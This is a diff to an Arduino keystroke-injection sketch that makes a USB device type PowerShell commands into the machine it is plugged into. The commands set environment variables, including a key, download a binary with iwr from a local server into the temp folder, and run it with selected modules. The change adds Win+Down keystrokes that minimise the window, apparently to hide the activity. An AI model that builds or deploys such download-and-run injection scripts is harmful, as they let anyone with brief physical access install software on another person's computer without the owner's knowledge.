@@ -1,7 +1,7 @@
-#include "Keyboard.h"
+#include <Keyboard.h>
 
 char notifyConfig[] = "$Env:RCDO_NOTIFY=0; `\n";
-char apiKey[] = "$Env:RCDO_KEY=\"whyare\"; `\n";
+char apiKey[] = "$Env:RCDO_KEY=\"rcdo\"; `\n";
 char dlCmd[] = "iwr -Uri http://localhost:5000/download/bin/watch-binary -OutFile $Env:temp\\rcdob.exe; `\n"; 
 
 
@@ -58,13 +58,16 @@ void startBinary(int *option){
   runPS();
   downloadBin();
   setupConfig(option[3]);
-  //strcpy(buf,binaryCmdline);
   char *mods = selectModules(option);
 
   Keyboard.print(".\\rcdob.exe ");
   Keyboard.print(mods);
   Keyboard.print("; `\nexit\n");
-
+  
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press(KEY_DOWN_ARROW);
+  Keyboard.releaseAll();
+  
   free(mods);
   Keyboard.end();
 }
